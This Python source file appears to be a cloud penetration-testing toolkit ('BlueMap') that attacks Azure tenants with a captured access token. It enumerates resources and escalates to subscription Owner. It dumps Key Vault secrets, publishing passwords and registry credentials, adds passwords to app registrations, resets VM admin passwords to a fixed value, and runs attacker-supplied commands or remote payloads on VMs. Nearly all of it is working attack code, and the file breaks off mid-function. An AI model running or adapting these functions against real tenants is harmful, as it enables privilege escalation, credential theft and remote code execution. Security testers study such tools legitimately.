import base64
import json, sys
import uuid
import os
import random
import string
import http.client
import urllib
import subprocess
from urllib.parse import urlparse
from xml.dom.minidom import parse
from xml.dom.minidom import parseString
import xml.dom.minidom
import ssl

Token = None
accessTokenGraph = None
accessTokenVault = None
TotalTargets = []
TargetSubscription = None
TargetTenantId = None
ExploitChoosen = None
hasGraphAccess = False
hasMgmtAccess = False
hasVaultEnabled = False
TrackLog = []

# Adapted From http://stackoverflow.com/questions/5909873/how-can-i-pretty-print-ascii-tables-with-python
def make_table(columns, data):
    """Create an ASCII table and return it as a string.

    Pass a list of strings to use as columns in the table and a list of
    dicts. The strings in 'columns' will be used as the keys to the dicts in
    'data.'

    """
    # Calculate how wide each cell needs to be
    cell_widths = {}
    for c in columns:
        lens = []
        values = [lens.append(len(str(d.get(c, "")))) for d in data]
        lens.append(len(c))
        lens.sort()
        cell_widths[c] = max(lens)

    # Used for formatting rows of data
    row_template = "|" + " {} |" * len(columns)

    # CONSTRUCT THE TABLE

    # The top row with the column titles
    justified_column_heads = [c.ljust(cell_widths[c]) for c in columns]
    header = row_template.format(*justified_column_heads)
    # The second row contains separators
    sep = "|" + "-" * (len(header) - 2) + "|"
    end = "-" * len(header)
    title = "-" * len(header)
    # Rows of data
    rows = []

    for d in data:
        fields = [str(d.get(c, "")).ljust(cell_widths[c]) for c in columns]
        row = row_template.format(*fields)
        rows.append(row)
    rows.append(end)
    return "\n".join([title,header, sep] + rows)
def sendGETRequest(url, Token):
    object = {}
    o = urlparse(url)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    conn = http.client.HTTPSConnection(o.netloc)
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + str(Token)
    }
    conn.request("GET", str(o.path) + "/?" + str(o.query), "", headers)
    res = conn.getresponse()
    object["headers"] = dict(res.getheaders())
    object["status_code"] = int(res.status)
    object["response"] = str(res.read().decode("utf-8"))
    try:
        object["json"] = json.loads(object["response"])
    except json.JSONDecodeError:
        pass
    return object

def sendPOSTRequest(url, body, Token):
    object = {}
    o = urlparse(url)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    conn = http.client.HTTPSConnection(o.netloc)
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + str(Token)
    }
    if body is not None:
        body = json.dumps(body)
    conn.request("POST", str(o.path) + "/?" + str(o.query), body, headers)
    res = conn.getresponse()
    object["headers"] = dict(res.getheaders())
    object["status_code"] = int(res.status)
    object["response"] = str(res.read().decode("utf-8"))
    try:
        object["json"] = json.loads(object["response"])
    except json.JSONDecodeError:
        pass
    return object
def sendPUTRequest(url, body, Token):
    object = {}
    o = urlparse(url)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    conn = http.client.HTTPSConnection(o.netloc)
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + str(Token)
    }
    if body is not None:
        body = json.dumps(body)
    conn.request("PUT", str(o.path) + "/?" + str(o.query), body, headers)
    res = conn.getresponse()
    object["headers"] = dict(res.getheaders())
    object["status_code"] = int(res.status)
    object["response"] = str(res.read().decode("utf-8"))
    try:
        object["json"] = json.loads(object["response"])
    except json.JSONDecodeError:
        pass
    return object
def get_random_string(size):
    chars = string.ascii_lowercase+string.ascii_uppercase+string.digits
    ''.join(random.choice(chars) for _ in range(size))
    return chars

def parseUPN():
    global Token
    if Token is None:
        print("No Token has been set.")
    else:
        b64_string = Token.split(".")[1]
        b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
        return json.loads(base64.b64decode(b64_string))['upn']

def parseUPNObjectId():
    global Token
    if Token is None:
        print("No Token has been set.")
    else:
        b64_string = Token.split(".")[1]
        b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
        return json.loads(base64.b64decode(b64_string))['oid']

def parseTenantId():
    global Token
    if Token is None:
        print("No Token has been set.")
    else:
        b64_string = Token.split(".")[1]
        b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
        return json.loads(base64.b64decode(b64_string))['tid']

def hasTokenInPlace():
    global Token
    if Token is None:
        return False
    else:
        return True

def setToken(token):
    global Token, hasMgmtAccess, hasGraphAccess, hasVaultEnabled
    if token == "":
        hasMgmtAccess = False
        hasGraphAccess = False
        hasVaultEnabled = False
    else:
        Token = token


def initToken(token, resetscopes):
    global Token, hasMgmtAccess, hasGraphAccess, hasVaultEnabled,TargetSubscription, TargetTenantId
    if resetscopes:
        hasMgmtAccess = False
        hasGraphAccess = False
        hasVaultEnabled = False
    Token = token
    listSubs = ListSubscriptionsForToken()
    TargetSubscription = listSubs['value'][0]['subscriptionId']
    TargetTenantId = parseTenantId()


def originitToken(token):
    check = token.split(".")[1]
    audAttribue = json.loads(base64.b64decode(check))['aud']
    if audAttribue != "https://management.azure.com/":
        print(
            "ERROR: Invalid audiance in token, please generate a token with correct audiance. Expected: https://management.azure.com/, provided " + audAttribue + " .")
        sys.exit(-1)
    else:
        print("All set.")
        global Token, hasMgmtAccess
        hasMgmtAccess = True
        Token = token


def currentScope():
    global hasMgmtAccess, hasGraphAccess, hasVaultEnabled
    global Token
    if Token is None:
        print("No Token has been set.")
    else:
        b64_string = Token.split(".")[1]
        b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
        audAttribue = json.loads(base64.b64decode(b64_string))['aud']
        strA = []
        if hasGraphAccess or "graph.microsoft.com" in audAttribue:
            strA.append("Graph enabled")
        if hasMgmtAccess or "management.azure.com" in audAttribue:
            strA.append("Azure RABC enabled")
        if hasVaultEnabled or 'vault.azure.net' in audAttribue:
            strA.append("Vault enabled")
        print("Enabled Scope(s): " + str(" | ").join(strA))

def currentProfile():
    global Token
    if Token is None:
        print("No Token has been set.")
    else:
        strigify = parseUPN().split("@")
        if Token == None:
            print("Please load a token.")
        else:
            print(strigify[1] + "\\" + strigify[0])

def RD_ListAllVMs():
    global Token
    result = []
    rs = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
    for sub in rs['json']['value']:
        for res in getResGroup(sub['subscriptionId'])['value']:
            rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Compute/virtualMachines?api-version=2022-08-01", Token)
            for item in rsVM['json']['value']:
                if 'identity' not in item:
                    item['identity'] = "N/A"

                item['subscriptionId'] = sub['subscriptionId']
                item['resourceGroup'] = res['name']
                result.append(item)
    return result

def RD_ListAllUsers():
    global accessTokenGraph
    r = sendGETRequest("https://graph.microsoft.com/v1.0/users/", accessTokenGraph)
    return r["json"]

def GA_ElevateAccess():
    global Token
    r = sendPOSTRequest("https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01", None, Token)
    result = r['response']
    if result == "":
        return "Exploit Success!"
    else:
        return "Exploit Failed."

def GA_AssignSubscriptionOwnerRole(subscriptionId):
    global Token
    r = sendPUTRequest(
        "https://management.azure.com/subscriptions/"+subscriptionId+"/providers/Microsoft.Authorization/roleAssignments/"+str(uuid.uuid4())+"?api-version=2015-07-01",
        {
              "properties": {
                "roleDefinitionId": "/subscriptions/"+subscriptionId+"/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635",
                "principalId": str(parseUPNObjectId())
              }
        },Token)
    result = r['json']
    if result['error']:
        return "Exploit Failed. Abort."
    else:
        return "Exploit Completed! You're Subscription Owner on SubscriptionId=" + str(subscriptionId)


def RD_AddAppSecret():
    global accessTokenGraph
    r = sendGETRequest("https://graph.microsoft.com/v1.0/applications", accessTokenGraph)
    return r['json']

def getResGroup(subid):
    global Token
    r = sendGETRequest("https://management.azure.com/subscriptions/"+subid+"/resourcegroups?api-version=2021-04-01", Token)
    return r['json']


def getArmTempPerResGroup(subid,resgroup):
    global Token
    r = sendGETRequest("https://management.azure.com/subscriptions/"+subid+"/resourcegroups/"+resgroup+"/providers/Microsoft.Resources/deployments/?api-version=2021-04-01", Token)
    return r['json']

def RD_ListExposedWebApps():
    global Token
    result = []
    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
    for sub in r['json']['value']:
        for res in getResGroup(sub['subscriptionId'])['value']:
            rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Web/sites?api-version=2022-03-01", Token)
            for item in rsVM['json']['value']:
                if 'identity' not in item:
                    item['identity'] = "N/A"

                item['subscriptionId'] = sub['subscriptionId']
                item['resourceGroup'] = res['name']
                result.append(item)
    return result

def RD_ListAllDeployments():
    global Token
    result = []
    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
    for sub in r['json']['value']:
        rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+sub["subscriptionId"]+"/providers/Microsoft.Web/sites?api-version=2022-03-01", Token)
        for item in rsVM['json']['value']:
            result.append(item)
    return result

def RD_ListAllACRs():
    global Token
    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
    for sub in r['json']['value']:
        rsub = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.ContainerRegistry/registries?api-version=2019-05-01", Token)
        return rsub['json']
    return False

def HLP_GetACRCreds(acrId):
    global Token
    r = sendGETRequest("https://management.azure.com/"+acrId+"/listCredentials?api-version=2019-05-01", Token)
    if r["status_code"] == 200:
        return r['json']
    else:
        return "Unable to fetch data ACR."

def HLP_ReadVaultSecretContent(SecretIdLink):
    global accessTokenVault
    rs = sendGETRequest(SecretIdLink+"?api-version=7.3",accessTokenVault)
    if rs['status_code'] == 200:
        return "OK|" + rs['json']['value']
    else:
        return "ERROR|Operation Failed: " + rs['json']['error']['message']

def HLP_AddVaultACL(vaultId):
    global Token
    rs = sendPUTRequest(
        "https://management.azure.com/" + vaultId + "/accessPolicies/add?api-version=2021-10-01",
        {
              "properties": {
                "accessPolicies": [
                  {
                    "tenantId": parseTenantId(),
                    "objectId": parseUPNObjectId(),
                    "permissions": {
                      "keys": [
                        "encrypt"
                      ],
                      "secrets": [
                        "get",
                        "list"
                      ],
                      "certificates": [
                        "get",
                        "list"
                      ]
                    }
                  }
                ]
              }
            },Token)
    if rs['status_code'] == 201 or rs['status_code'] == 200:
        return True
    else:
        return False

def HLP_GetSecretsInVault(vaultName):
    global accessTokenVault
    rs = sendGETRequest(
        "https://"+str(vaultName).lower()+".vault.azure.net/secrets?api-version=7.3",
        accessTokenVault)
    if rs['status_code'] == 200:
        return "OK|"
    else:
        return "ERROR|Operation Failed: " + rs['json']['error']['message']

def HLP_GetSecretsInVaultNoStrings(vaultName):
    global accessTokenVault
    rs = sendGETRequest("https://"+str(vaultName).lower()+".vault.azure.net/secrets?api-version=7.3", accessTokenVault)
    if rs["status_code"] == 200:
        return rs['json']['value']
    else:
        return rs['json']['error']['message']

def HLP_GetSecretValueTXT(vaultSecretId):
    global accessTokenVault
    rs = sendGETRequest(vaultSecretId+"?api-version=7.3",accessTokenVault)
    if rs['status_code'] == 200:
        return rs['json']['value']
    else:
        return rs['json']['error']['message']

def HLP_GetVMInstanceView(subscriptionId,resourceGroupName,vmName):
    global Token
    rs = sendGETRequest("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/virtualMachines/"+vmName+"/instanceView?api-version=2022-08-01", Token)
    if rs['status_code'] == 200:
        return rs['json']['statuses'][1]['code']
    else:
        return "Unable to fetch VM data."

def RD_ListAllVMs():
    global Token
    result = []
    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
    for sub in r['json']['value']:
        for res in getResGroup(sub['subscriptionId'])['value']:
            rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Compute/virtualMachines?api-version=2022-08-01", Token)
            for item in rsVM['json']['value']:
                if 'identity' not in item:
                    item['identity'] = "N/A"

                item['subscriptionId'] = sub['subscriptionId']
                item['resourceGroup'] = res['name']
                result.append(item)
    return result

def RD_ListAllVaults():
    global Token
    result = []
    rs = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
    for sub in rs['json']['value']:
        for res in getResGroup(sub['subscriptionId'])['value']:
            rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.KeyVault/vaults?api-version=2021-10-01", Token)
            for item in rsVM['json']['value']:
                item['subscriptionId'] = sub['subscriptionId']
                item['resourceGroup'] = res['name']
                result.append(item)
    return result
def RD_ListAllStorageAccounts():
    global Token
    result = []
    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
    for sub in r['json']['value']:
        for res in getResGroup(sub['subscriptionId'])['value']:
            rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Storage/storageAccounts?api-version=2021-09-01", Token)
            for item in rsVM['json']['value']:
                item['subscriptionId'] = sub['subscriptionId']
                item['resourceGroup'] = res['name']

                if 'allowSharedKeyAccess' not in item['properties']:
                    item['allowSharedKeyAccess'] = "N/A"
                else:
                    item['allowSharedKeyAccess'] = item['properties']['allowSharedKeyAccess']

                if 'customDomain' not in item['properties']:
                    item['customDomain'] = "N/A"
                else:
                    item['customDomain'] = item['properties']['customDomain']

                result.append(item)
    return result
def CON_GenerateVMDiskSAS(subscriptionId, resourceGroupName, vmDiskName):
    global Token
    req = {
        "access": "read",
        "durationInSeconds": 86400
    }
    rs = sendPOSTRequest("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/disks/"+vmDiskName+"/beginGetAccess?api-version=2022-03-02", req, Token)
    if rs['status_code'] == 202:
        rsAsync = sendGETRequest(str(rs['headers']['Location']),Token)
        return "Disk Ready! The SAS Download For the next 24 hours (Disk:" + vmDiskName + "): " + rsAsync['json']['accessSAS']
    else:
        return "Failed to generate SAS link for Disk."
def CON_GetPublishProfileBySite(SiteId):
    global Token
    output = []
    rs = sendPOSTRequest("https://management.azure.com/"+SiteId+"/publishxml?api-version=2022-03-01", None, Token)
    rsConf = sendGETRequest("https://management.azure.com/"+SiteId+"/config/web?api-version=2022-03-01", Token)
    if rs["status_code"] == 200:
        print(rs["response"])
        DOMTree = xml.dom.minidom.parseString(rs["response"])
        xmlContent = DOMTree.documentElement
        profiles = xmlContent.getElementsByTagName('publishProfile')

        if rsConf["status_code"] == 200:
            connectionStrings = rsConf['json']['properties']['connectionStrings']
            if connectionStrings is not None:
                output.append(
                    {"name": "ConnectionStrings", "user": str("\n".join(connectionStrings)), "pwd": "", "host": ""})

        for profile in profiles:
            name = profile.getAttribute('profileName')
            host = profile.getAttribute('publishUrl')
            user = profile.getAttribute('userName')
            pwd = profile.getAttribute('userPWD')
            sqlConnectionString = profile.getAttribute('SQLServerDBConnectionString')
            mySQLConnectionString = profile.getAttribute('mySQLDBConnectionString')
            output.append({"name": name, "user": user, "pwd": pwd, "host": host})
            if sqlConnectionString != "":
                output.append({"name": "SQLServerDB", "user": sqlConnectionString, "pwd": "", "host": ""})
            if mySQLConnectionString != "":
                output.append({"name": "MySQLServerDB", "user": mySQLConnectionString, "pwd": "", "host": ""})
        return output
    else:
        return "Failed to parse deployment template"

def CON_VMExtensionExecution(subscriptionId, location, resourceGroupName, vmName, PayloadURL):
    global Token
    vmExtensionName = get_random_string(20)
    r = sendPUTRequest(
        "https://management.azure.com/subscriptions/" + subscriptionId + "/resourceGroups/" + resourceGroupName + "/providers/Microsoft.Compute/virtualMachines/" + vmName + "/extensions/" + vmExtensionName + "?api-version=2022-08-01",
        {
            "location": location,
            "properties": {
                "publisher": "Microsoft.Compute",
                "typeHandlerVersion": "1.0",
                "type": "CustomScriptExtension",
                "autoUpgradeMinorVersion": True,
                "protectedSettings": {
                    "commandToExecute": os.path.basename(urlparse(PayloadURL).path),
                    "fileUris": [PayloadURL]
                }
            }
        },Token)
    if r['status_code'] == 201:
        return "Created! It should be ready within 5-10 min."
    else:
        return "Failed to create VM Extension.\nReason: " + str(r['json']['error']['message'])

def CON_VMRunCommand(subscriptionId, resourceGroupName, osType, vmName, Command):
    global Token

    if osType == "Windows":
        exec = "RunPowerShellScript"
    else:
        exec = "RunShellScript"

    req = {
        "commandId": exec,
        "script": [Command]
    }
    rs = sendPOSTRequest("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/virtualMachines/"+vmName+"/runCommand?api-version=2022-08-01",req, Token)
    if rs['status_code'] == 202 or rs['status_code'] == 200:
        return "Successfully Created Shell Script."
    else:
        return "Failed to Create Shell Script."



def CON_VMExtensionResetPwd(subscriptionId, location, resourceGroupName, vmName, adminAccount):
    global Token
    vmExtensionName = "RandomExtNas" + get_random_string(8)
    r = sendPUTRequest(
        "https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Compute/virtualMachines/"+vmName+"/extensions/"+vmExtensionName+"?api-version=2022-08-01",
        {
              "location": location,
              "properties": {
                "publisher": "Microsoft.Compute",
                "typeHandlerVersion": "2.0",
                "type": "VMAccessAgent",
                "autoUpgradeMinorVersion": True,
                "protectedSettings": {
                    "password": "secretPass123"
                }
              }
            },Token)
    if r['status_code'] == 201:
        return "Created! It should be ready within 5-10 min. \nLogin to "+vmName+" using " + adminAccount + ":secretPass123 as login details."
    else:
        return "Failed to create VM Extension.\nReason: " + str(r['json']['error']['message'])

def RD_ListAutomationAccounts():
    global Token
    result = []
    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
    for sub in r['json']['value']:
        rsub = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22", Token)
        for item in rsub['json']['value']:
            item['subscriptionId'] = sub['subscriptionId']
            result.append(item)
    return result

def RD_ListRunBooksByAutomationAccounts():
    global Token
    result = []
    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
    for sub in r['json']['value']:
        pathToAutomationAccount = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22", Token)
        for automationAccount in pathToAutomationAccount['json']['value']:
            GetRunBook = sendGETRequest("https://management.azure.com/" + str(automationAccount['id']) + "/runbooks?api-version=2019-06-01", Token)
            for item in GetRunBook['json']['value']:
                item['subscriptionId'] = str(sub['subscriptionId'])
                item['automationAccount'] = str(automationAccount['name'])
                result.append(item)
    return result

def RD_ListARMTemplates():
    global Token
    finalResult = []
    rs = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
    for sub in rs['json']['value']:
        for res in getResGroup(sub['subscriptionId'])['value']:
            for template in getArmTempPerResGroup(sub['subscriptionId'], res['name'])['value']:
                currenttemplate = template
                currentdata = {'name': currenttemplate['name'], 'id': currenttemplate['id']}
                if 'parameters' in currenttemplate['properties']:
                    currentdata['params'] = currenttemplate['properties']['parameters']
                else:
                    continue
                if 'outputs' in currenttemplate['properties']:
                    currentdata['outputs'] = currenttemplate['properties']['outputs']
                else:
                    continue
                finalResult.append(currentdata)
    return finalResult
def CHK_AppRegOwner(appId):
    global accessTokenGraph
    r = sendGETRequest("https://graph.microsoft.com/v1.0/applications?$filter=" + urllib.parse.quote("appId eq '" + appId + "'"), accessTokenGraph)
    appData = r['json']['value'][0]['id']
    AppOwners = sendGETRequest("https://graph.microsoft.com/v1.0/applications/" + str(appData) + "/owners", accessTokenGraph)
    if str(parseUPN()) in AppOwners["response"]:
        return "Yes! Try Exploit: Reader/abuseServicePrincipals"
    else:
        return "N/A"

def RD_addPasswordForEntrepriseApp(appId):
    global accessTokenGraph
    r = sendGETRequest(
        "https://graph.microsoft.com/v1.0/applications?$filter=" + urllib.parse.quote("appId eq '" + appId + "'"),
        accessTokenGraph)
    appData = r['json']['value'][0]['id']
    req = {
            "passwordCredential": {
                "displayName": "Password"
            }
    }
    addSecretPwd = sendPOSTRequest("https://graph.microsoft.com/v1.0/applications/" + str(appData) + "/addPassword", req, accessTokenGraph)
    if addSecretPwd['status_code'] == 200:
        pwdOwn = addSecretPwd['json']
        return "AppId: " + pwdOwn['keyId'] + "| Pwd: " + pwdOwn['secretText']
    else:
        return "N/A"

def tryGetToken():
    global accessTokenGraph, accessTokenVault, hasGraphAccess, hasMgmtAccess, hasVaultEnabled
    try:
        accessToken = None
        add = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=https://management.azure.com/"], capture_output=True, text=True)
        graph = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=https://graph.microsoft.com"], capture_output=True, text=True)
        vault = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=https://vault.azure.net"], capture_output=True, text=True)
        if 'The term \'az\' is not recognized as the name of a cmd' in add.stderr or graph.stderr:
            print("No Az Cli model installed. Please install if possible and try again.")
            print("Use the command to install: Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; rm .\AzureCLI.msi")
            print("Failed generate token.")
        elif 'No subscription found' in add.stderr or graph.stderr:
            print("No subscriptions were found. You will need to switch to tenant-level access manually: az login --allow-no-subscriptions")
            print("Failed generate token. You may need to login or try manually.")
        elif 'Exception' in add.stderr or graph.stderr:
            print("Unable to use azure cli for generating token")
            print("Failed generate token. You may need to login or try manually.")
        elif add.stdout == "" or graph.stdout == "":
            print("Failed generate token. You may need to login or try manually.")
        else:
            if vault.stdout == "":
                hasVaultEnabled = False
            else:
                vaultToken = json.loads(vault.stdout)
                accessTokenVault = vaultToken['accessToken']
                hasVaultEnabled = True
            hasGraphAccess = True
            hasMgmtAccess = True
            print("Captured token done. All set!")
            jres = json.loads(add.stdout)
            jresgraph = json.loads(graph.stdout)
            accessToken = jres['accessToken']
            accessTokenGraph = jresgraph['accessToken']
        return accessToken
    except KeyError:
        return False
    except:
        return False



def canRoleBeAbused(currentRoleName):
    vaultAbuseRoles = ["Key Vault Secrets Officer", "Key Vault Secrets User", "Key Vault Administrator"]
    vaultAbuseCertAndKeysOnlyRoles = ["Key Vault Certificates Officer", "Key Vault Crypto Officer"]
    shadowRisks = ["Cloud Application Administrator", "Application Administrator", "Password Administrator",
                   "Privileged Authentication Administrator", "Authentication Administrator",
                   "Privileged Role Administrator", "User Account Administrator", "User Administartor",
                   "Helpdesk Administartor"]
    classicAdministartors = ["Account Administrator", "Service Administrator", "Co-Administrator"]
    if currentRoleName in vaultAbuseRoles:
        return currentRoleName + "|" + "allows to retrieve secrets from key vault."
    elif currentRoleName in vaultAbuseCertAndKeysOnlyRoles:
        return currentRoleName + "|" + "allows to retrieve Certifications/Keys ONLY from key vault."
    elif currentRoleName == "Contributor":
        return currentRoleName + "|" + "can manage all Azure services, without the ability to create role assignments."
    elif currentRoleName == "Reader":
        return currentRoleName + "|" + "allows to read data of the resource."
    elif currentRoleName == "Global Reader":
        return currentRoleName + "|" + "Can read everything in Azure AD, without the ability to update."
    elif currentRoleName == "Global Administrator" or currentRoleName == "Company Administrator":
        return currentRoleName + "|" + "has a god mode, which can manage all aspects of Azure AD. (think like Domain Admin)"
    elif currentRoleName == "Virtual Machine Contributor":
        return currentRoleName + "|" + "allows manage of VMs including disks, snapshots, extensions, and password restoration."
    elif currentRoleName == "Automation Operator" or currentRoleName == "Automation Contributor":
        return currentRoleName + "|" + "allows create and manage jobs, and read runbook names and properties for all runbooks in an Automation account."
    elif currentRoleName == "Storage Blob Data Reader":
        return currentRoleName + "|" + "allows read, write, and delete storage containers and blobs."
    elif currentRoleName == "User Access Administrator":
        return currentRoleName + "|" + "has manage access to all resources within the subscription."
    elif currentRoleName in shadowRisks:
        return currentRoleName + "|" + " has full directory admin rights, easy way to esclate."
    elif currentRoleName in classicAdministartors:
        return currentRoleName + "|" + "Is found as one of the three classic subscription administrative roles. Please notice: Service Administrator and Account Administrator are equivalent to the Owner role in the subscription."
    elif currentRoleName == "Owner":
        return currentRoleName + "|" + "has high privlieged permission, allows to esclate to subscription/tenat level via given resource."
    return False


def canPermissionBeAbused(currentPermission):
    vmPermissions = ["Microsoft.Compute/virtualMachines/runCommand/action",
                     "Microsoft.Compute/virtualMachines/extensions/*"]
    vmAllowDeployPermission = ["Microsoft.Compute/virtualMachines/write"]
    AutomationAccounts = ["Microsoft.Automation/automationAccounts/*",
                          "Microsoft.Automation/automationAccounts/jobs/write",
                          "Microsoft.Automation/automationAccounts/jobSchedules/write"]
    AutomationAccountsRO = ["Microsoft.Automation/automationAccounts/read",
                            "Microsoft.Automation/automationAccounts/runbooks/read",
                            "Microsoft.Automation/automationAccounts/schedules/read",
                            "Microsoft.Automation/automationAccounts/jobs/read"]
    StorangeAccountAbuse = ["Microsoft.ClassicStorage/storageAccounts/listKeys/action",
                            "Microsoft.ClassicStorage/storageAccounts/listKeys/action",
                            "Microsoft.Storage/listAccountSas/action",
                            "Microsoft.Storage/listServiceSas/action"]
    ARMTemplateAbuse = ["Microsoft.Resources/deployments/*"]
    DirectoryAbuse = ["Microsoft.Resources/deployments/*"]
    ExtensionsAbuse = ["Microsoft.ClassicCompute/virtualMachines/extensions/*",
                       "Microsoft.Compute/virtualMachines/extensions/read",
                       "Microsoft.Compute/virtualMachines/extensions/write"]
    HybridCompute = ["Microsoft.HybridCompute/machines/extensions/write"]
    AllSubscriptions = ["Microsoft.Resources/subscriptions/resourcegroups/deployments/*"]
    AllowToManageRBAC = ["Microsoft.Authorization/roleAssignments/*", "Microsoft.Authorization/*",
                         "Microsoft.Authorization/*/Write", "Microsoft.Authorization/roleAssignments/*",
                         "Microsoft.Authorization/roleDefinition/*", "Microsoft.Authorization/roleDefinitions/*",
                         "Microsoft.Authorization/elevateAccess/Action", "Microsoft.Authorization/roleDefinition/write",
                         "Microsoft.Authorization/roleDefinitions/write",
                         "Microsoft.Authorization/roleAssignments/write",
                         "Microsoft.Authorization/classicAdministrators/write"]
    if currentPermission == "*":
        return "" + "|" + "That's means to have a Contributor/Owner permission on resources."
    elif currentPermission in vmPermissions:
        return currentPermission + "|" + "allows execute code on Virtual Machines."
    elif currentPermission in vmAllowDeployPermission:
        return currentPermission + "|" + "allows VM deployment or configuraiton of existing VM."
    elif currentPermission in StorangeAccountAbuse:
        return currentPermission + "|" + "can abuse storage accounts (i.e., view blobs)."
    elif currentPermission in ARMTemplateAbuse:
        return currentPermission + "|" + "allows create and execute of deployment actions."
    elif all(k in currentPermission for k in
             ("Microsoft.Resources/deployments/read", "Microsoft.Resources/subscriptions/resourceGroups/read")):
        return currentPermission + "|" + "have the ability to view ARM templates and history data."
    elif currentPermission in ExtensionsAbuse or currentPermission in HybridCompute:
        return currentPermission + "|" + "allows abuse of VM extensions. (make sure that you have read + write for Custome Script extenstions)"
    elif currentPermission in AllSubscriptions:
        return currentPermission + "|" + "has permission for all subscriptions."
    elif currentPermission == "*/read":
        return currentPermission + "|" + "has read all permission for data."
    elif currentPermission in AutomationAccounts:
        return currentPermission + "|" + "has ability to create automation account jobs (runbooks)."
    elif currentPermission in AutomationAccountsRO:
        return currentPermission + "|" + "has ability to read automation jobs (runbooks)."
    elif currentPermission == "Microsoft.Authorization/*/read":
        return currentPermission + "|" + "has permission to read roles and role assignments."
    elif currentPermission in AllowToManageRBAC:
        return currentPermission + "|" + "able to preform RBAC operations (i.e., add permissions,roles)."
    return False


def GetAllRoleAssignmentsUnderSubscription(subscriptionId):
    global Token
    r = sendGETRequest("https://management.azure.com/subscriptions/" + subscriptionId + "/providers/Microsoft.Authorization/roleAssignments?api-version=2015-07-01", Token)
    return r['json']

def RD_DumpRunBookContent(runbookGUID):
    global Token
    r = sendGETRequest("https://management.azure.com/" + runbookGUID + "/content?api-version=2019-06-01",Token)
    if r["status_code"] == 200:
        result = r["response"]
    else:
        result = None
    return result

def HLP_GetAzVMPublicIP(subscriptionId,resourceGroupName,publicIpAddressName):
    global Token
    r = sendGETRequest("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Network/publicIPAddresses/"+publicIpAddressName+"PublicIP?api-version=2022-01-01", Token)
    if r["status_code"] == 200:
        if "ipAddress" not in r['json']['properties']:
            result = "N/A"
        else:
            result = r['json']['properties']['ipAddress']
    else:
        result = "N/A"
    return result

def GetAllRoleAssignmentsUnderSubscriptionAndResourceGroup(subscriptionId,resourceGroupId):
    global Token
    r = sendGETRequest("https://management.azure.com/subscriptions/" + subscriptionId + "/resourceGroups/"+resourceGroupId+"/providers/Microsoft.Authorization/roleAssignments?api-version=2015-07-01", Token)
    return r['json']


def GetAllRoleDefinitionsUnderId(roleId):
    global Token
    r = sendGETRequest("https://management.azure.com/" + roleId + "?api-version=2015-07-01", Token)
    return r['json']


def AboutWindow():
    print("BlueMap Developed By Maor Tal (@th3location)")


def getToken():
    return Token

def ListSubscriptionsForToken():
    global Token
    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
    return r['json']


def GetAllResourcesUnderSubscription(subscriptionId, token):
    r = sendGETRequest("https://management.azure.com/subscriptions/" + subscriptionId + "/resources?api-version=2017-05-10", token)
    return r['json']

def GetAllResourceGroupsUnderSubscription(subscriptionId):
    global Token
